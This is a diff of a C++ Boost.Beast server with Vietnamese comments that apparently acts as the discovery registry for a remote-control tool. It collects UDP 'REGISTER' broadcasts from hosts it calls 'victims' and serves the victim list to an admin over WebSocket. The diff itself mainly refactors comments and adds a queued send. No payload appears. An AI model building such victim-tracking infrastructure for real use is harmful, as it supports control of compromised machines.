@@ -1,11 +1,15 @@
 ﻿// =============================================================
-// AURALINK REGISTRY SERVER
+// AURALINK REGISTRY SERVER (MAIN.CPP)
 // Nhiệm vụ:
 // 1. Lắng nghe UDP Broadcast từ các máy nạn nhân (Discovery)
 // 2. Cung cấp danh sách nạn nhân cho Admin qua WebSocket
 // =============================================================
 
+// --- 1. CẤU HÌNH & THƯ VIỆN HỆ THỐNG ---
+#ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0A00
+#endif
+
 #include <boost/beast/core.hpp>
 #include <boost/beast/websocket.hpp>
 #include <boost/asio/ip/tcp.hpp>
@@ -20,9 +24,10 @@
 #include <mutex> 
 #include <chrono> 
 
-// --- CAU HINH WINDOWS ---
+// Link thư viện Windows Socket
 #pragma comment(lib, "ws2_32.lib")
 
+// --- 2. NAMESPACE & ĐỊNH NGHĨA ---
 namespace beast = boost::beast;
 namespace http = beast::http;
 namespace websocket = beast::websocket;
@@ -31,7 +36,7 @@ using tcp = boost::asio::ip::tcp;
 using udp = boost::asio::ip::udp;
 
 // =============================================================
-// CẤU TRÚC DỮ LIỆU
+// PHẦN 3: CẤU TRÚC DỮ LIỆU
 // =============================================================
 
 struct VictimInfo {
@@ -43,24 +48,24 @@ struct VictimInfo {
     std::chrono::steady_clock::time_point last_seen;
 };
 
-class Session; // Forward declaration
+// Forward declaration
+class Session;
 
 // =============================================================
-// QUẢN LÝ SERVER (SERVER MANAGER)
+// PHẦN 4: QUẢN LÝ SERVER (SERVER MANAGER)
 // =============================================================
 
 class ServerManager {
 public:
     std::vector<VictimInfo> discovered_victims;
-    std::mutex list_mutex; // Khóa bảo vệ danh sách
-    std::vector<std::shared_ptr<Session>> admins;
+    std::mutex list_mutex; // Khóa bảo vệ danh sách (Thread-safe)
 
     // Xử lý khi nhận được gói tin UDP từ Victim
     void RegisterVictim(std::string ip, std::string id, std::string name, std::string os, std::string port) {
         std::lock_guard<std::mutex> lock(list_mutex);
 
         bool found = false;
-        // Cập nhật thông tin nếu đã tồn tại
+        // Cập nhật thông tin nếu Victim đã tồn tại trong danh sách
         for (auto& v : discovered_victims) {
             if (v.id == id || v.ip == ip) {
                 v.ip = ip;
@@ -92,14 +97,13 @@ public:
         return listMsg;
     }
 
-    void join_admin(std::shared_ptr<Session> session) {
-        // Chỉ cần lưu lại để quản lý, hoặc có thể không cần nếu không broadcast ngược lại
+    void JoinAdmin(std::shared_ptr<Session> session) {
         std::cout << "[ADMIN] New Admin connected via WebSocket.\n";
     }
 };
 
 // =============================================================
-// UDP LISTENER THREAD (Lắng nghe quảng bá)
+// PHẦN 5: UDP LISTENER (LẮNG NGHE QUẢNG BÁ)
 // =============================================================
 
 void UDP_Listener_Thread(ServerManager& manager, unsigned short port) {
@@ -118,7 +122,7 @@ void UDP_Listener_Thread(ServerManager& manager, unsigned short port) {
 
             // Gói tin mong đợi: "REGISTER|ID|Name|OS|Port"
             if (msg.rfind("REGISTER|", 0) == 0) {
-                // Parse dữ liệu thủ công để tránh dependency nặng
+                // Parse dữ liệu thủ công
                 std::vector<std::string> parts;
                 std::string s = msg;
                 size_t pos = 0;
@@ -128,7 +132,7 @@ void UDP_Listener_Thread(ServerManager& manager, unsigned short port) {
                 }
                 parts.push_back(s);
 
-                // Kiểm tra đủ trường dữ liệu
+                // Kiểm tra đủ trường dữ liệu (Header + 4 fields)
                 if (parts.size() >= 5) {
                     std::string id = parts[1];
                     std::string name = parts[2];
@@ -147,13 +151,15 @@ void UDP_Listener_Thread(ServerManager& manager, unsigned short port) {
 }
 
 // =============================================================
-// WEBSOCKET SESSION (Xử lý kết nối từ Admin)
+// PHẦN 6: WEBSOCKET SESSION (KẾT NỐI VỚI CLIENT)
 // =============================================================
 
 class Session : public std::enable_shared_from_this<Session> {
     websocket::stream<beast::tcp_stream> ws_;
     beast::flat_buffer buffer_;
     ServerManager& manager_;
+
+    std::vector<std::shared_ptr<std::string>> queue_;
 
 public:
     explicit Session(tcp::socket&& socket, ServerManager& manager)
@@ -170,6 +176,45 @@ public:
         do_read();
     }
 
+    // --- HÀM GỬI DỮ LIỆU AN TOÀN (THREAD-SAFE SEND) ---
+    void send(std::string msg) {
+        auto self = shared_from_this();
+        auto msg_ptr = std::make_shared<std::string>(std::move(msg));
+
+        net::post(ws_.get_executor(), [self, msg_ptr]() {
+            if (!self->ws_.is_open()) return;
+
+            self->queue_.push_back(msg_ptr);
+
+            if (self->queue_.size() > 1) return;
+
+            self->do_write();
+            });
+    }
+
+    void do_write() {
+        if (queue_.empty()) return;
+
+        auto const& msg_ptr = queue_.front();
+        ws_.text(true);
+        ws_.async_write(net::buffer(*msg_ptr),
+            beast::bind_front_handler(&Session::on_write, shared_from_this()));
+    }
+
+    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
+        boost::ignore_unused(bytes_transferred);
+        if (ec) {
+            std::cerr << "Write Error: " << ec.message() << "\n";
+            queue_.clear();
+            return;
+        }
+
+        queue_.erase(queue_.begin()); // Xóa tin nhắn đã gửi xong
+
+        if (!queue_.empty()) do_write(); // Gửi tiếp nếu còn
+    }
+
+    // --- HÀM ĐỌC DỮ LIỆU ---
     void do_read() {
         ws_.async_read(buffer_, beast::bind_front_handler(&Session::on_read, shared_from_this()));
     }
@@ -186,29 +231,15 @@ public:
         do_read();
     }
 
-    void send(std::string msg) {
-        auto self = shared_from_this();
-
-        // 1. Tạo một pointer thông minh để lưu dữ liệu sang vùng nhớ Heap (giữ nó sống)
-        auto msg_ptr = std::make_shared<std::string>(std::move(msg));
-
-        // 2. Capture (bắt) msg_ptr vào trong lambda để nó tồn tại cùng với lambda
-        ws_.async_write(net::buffer(*msg_ptr),
-            [self, msg_ptr](beast::error_code ec, std::size_t) {
-                if (ec) std::cerr << "Write Error: " << ec.message() << "\n";
-                // Khi lambda này chạy xong, msg_ptr mới được giải phóng -> An toàn!
-            });
-    }
-
 private:
     void handle_message(std::string msg) {
         // Admin xác thực
         if (msg.rfind("TYPE:ADMIN", 0) == 0) {
-            manager_.join_admin(shared_from_this());
+            manager_.JoinAdmin(shared_from_this());
             // Gửi ngay danh sách khi vừa kết nối
             send(manager_.GetDiscoveredList());
         }
-        // Admin yêu cầu cập nhật danh sách
+        // Admin yêu cầu cập nhật danh sách (Polling)
         else if (msg == "GET_DISCOVERED_CLIENTS") {
             send(manager_.GetDiscoveredList());
         }
@@ -216,7 +247,7 @@ private:
 };
 
 // =============================================================
-// TCP LISTENER
+// PHẦN 7: TCP LISTENER (CHẤP NHẬN KẾT NỐI)
 // =============================================================
 
 class Listener : public std::enable_shared_from_this<Listener> {
@@ -245,10 +276,10 @@ private:
 };
 
 // =============================================================
-// MAIN FUNCTION
+// PHẦN 8: HÀM MAIN (ENTRY POINT)
 // =============================================================
+
 int main() {
-    system("chcp 65001 > nul");
     auto const address = net::ip::make_address("0.0.0.0");
 
     // Cổng WebSocket cho Admin (TCP)
@@ -272,7 +303,7 @@ int main() {
     std::thread udpThread(UDP_Listener_Thread, std::ref(manager), udp_port);
     udpThread.detach();
 
-    // 2. Chạy thread lắng nghe WebSocket (Main)
+    // 2. Chạy thread lắng nghe WebSocket (Main Loop)
     std::make_shared<Listener>(ioc, tcp::endpoint{ address, ws_port }, manager)->run();
 
     ioc.run();
